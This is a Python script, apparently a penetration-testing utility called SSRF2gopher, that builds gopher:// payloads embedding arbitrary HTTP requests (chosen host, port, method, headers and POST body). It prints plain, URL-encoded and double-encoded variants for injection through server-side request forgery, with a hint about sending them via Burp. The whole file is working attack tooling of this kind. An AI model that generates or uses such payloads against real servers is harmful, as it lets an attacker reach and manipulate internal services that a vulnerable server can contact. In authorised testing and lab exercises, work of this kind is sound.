#!/usr/bin/python3
import urllib.parse
import argparse
import sys

def banner():
    banner = '''
   ___________  _______                 __          
  / __/ __/ _ \\/ __/_  |___ ____  ___  / /  ___ ____ 
 _\\ \\_\\ \\/ , _/ _// __// _ `/ _ \\/ _ \\/ _ \\/ -_) __/ 
/___/___/_/|_/_/ /____/\\_, /\\___/ .__/_//_/\\__/_/    
                      /___/    /_/                   

Created by eMVee 
    '''
    return banner

def url_encode_payload(data):
    encoded_data = data.replace(' ', '%20').replace('=', '%3d').replace('&', '%26')
    encoded_data = encoded_data.replace('\n', '%0a')
    return encoded_data

def double_url_encode_payload(data):
    encoded_data = data.replace(':', '%3a').replace('%20', '%2520')
    encoded_data = encoded_data.replace('%0a', '%250a')
    return encoded_data

def another_option(data):
    encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
    encoded_data = encoded_data.replace('%0a', '%250a')
    return encoded_data

def host_header(host):
    return "Host: " + host

# 🔻 Modified this function to accept `body`
def generate_gopher_payload(host, port, endpoint, custom_headers, method, body=None):
    payload = generate_gopher_request(host, port, endpoint, method) + "\n"
    payload += host_header(host) + "\n"

    for header, value in custom_headers.items():
        payload += f"{header}: {value}\n"

    payload += "\n"  # separate headers from body
    if method == "POST" and body:
        payload += body
    return payload

def generate_gopher_request(host, port, endpoint, method):
    return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"

def parse_headers(headers_list):
    custom_headers = {}
    if headers_list:
        for header in headers_list:
            try:
                name, value = header.split(':', 1)
                custom_headers[name.strip()] = value.strip()
            except ValueError:
                print(f"[!] Invalid header format: {header}")
                print("Headers should be in the format 'Name:Value'")
                sys.exit(1)
    return custom_headers

def main():
    parser = argparse.ArgumentParser(description='Gopher payload generator with custom headers support')
    parser.add_argument('-u', '--host', help='Target host address')
    parser.add_argument('-p', '--port', help='Gopher port number')
    parser.add_argument('-e', '--endpoint', help='Target endpoint')
    parser.add_argument('-H', '--headers', nargs='*', help='Custom headers in format "Name:Value"')
    parser.add_argument('-m', '--method', help='HTTP method (GET, POST, PUT, etc.)')

    args = parser.parse_args()
    print(banner())

    host = args.host if args.host else input("[?] What is the address of the Host? ")
    port = args.port if args.port else input("[?] What port should be used for gopher? ")
    endpoint = args.endpoint if args.endpoint else input("[?] What endpoint should be used for gopher? ")
    method = args.method.upper() if args.method else input("[?] What HTTP method should be used? (GET, POST, PUT, etc.) ").upper() or "GET"

    if args.headers:
        custom_headers = parse_headers(args.headers)
    else:
        custom_headers = {}
        if input("[?] Would you like to add custom headers? (y/n) ").lower() == 'y':
            while True:
                user_input = input("[?] Enter header (or press enter to finish): ").strip()
                if not user_input:
                    break
                header, value = user_input.split(":", 1)
                custom_headers[header.strip()] = value.strip()

    # 🔻 Prompt for POST body input
    body = None
    if method == "POST":
        body = input("[?] Enter POST body content: ")

    try:
        print("\n[!] Plain text payload:\n")
        payload = generate_gopher_payload(host, port, endpoint, custom_headers, method, body)
        print(payload)

        encoded_payload = url_encode_payload(payload)
        print("\n[!] URL encoded payload:")
        print(encoded_payload)

        print("\n[!] Double URL encoded payload:")
        print(double_url_encode_payload(encoded_payload))

        print("\n[!] Another option that might work via something like BURP:")
        print(another_option(encoded_payload))

    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user. Exiting...")
        sys.exit(1)

if __name__ == "__main__":
    main()

